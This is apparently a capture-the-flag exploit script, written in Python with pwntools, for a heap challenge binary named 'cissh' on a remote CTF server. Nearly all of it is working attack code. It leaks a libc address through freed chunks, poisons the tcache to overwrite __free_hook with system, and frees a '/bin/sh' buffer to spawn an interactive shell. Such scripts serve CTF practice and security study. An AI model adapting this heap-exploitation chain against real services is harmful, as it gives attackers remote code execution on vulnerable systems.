# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './cissh'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25217'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def touch(name):
    sla('\x1B[31m$ \x1B[m','touch %s'%name)

def vi(name,content):
    sla('\x1B[31m$ \x1B[m','vi %s'%name)
    sl(content)

def cat(name):
    sla('\x1B[31m$ \x1B[m','cat %s'%name)

def rm(name):
    sla('\x1B[31m$ \x1B[m','rm %s'%name)

def ln(name1,name2):
    sla('\x1B[31m$ \x1B[m','ln {0} {1}'.format(name1 , name2) )

# one_gad = one_gadget(libc.path)

for i in range(8):
    touch(i)
    vi(i , 'a'*0x100)

ln('a' , 7)
# 链到 unsortedbin 堆块
ln('b' , 6)
# 链到 tcache 头堆块

for i in range(8):
    rm(i)

cat('a')
leak = l64() - 0x70
lg('leak',leak)
libc.address = leak - libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']

vi('b' , p64(__free_hook))

touch('c')
vi('c' , '/bin/sh\x00'.ljust(0x100,'\x00'))

touch('d')
vi('d' , p64(system).ljust(0x100,'\x00'))
# dbg()

rm('c')
# dbg()

p.interactive()

'''
@File    :   cissh.py
@Time    :   2021/08/30 14:07:47
@Author  :   Niyah 
'''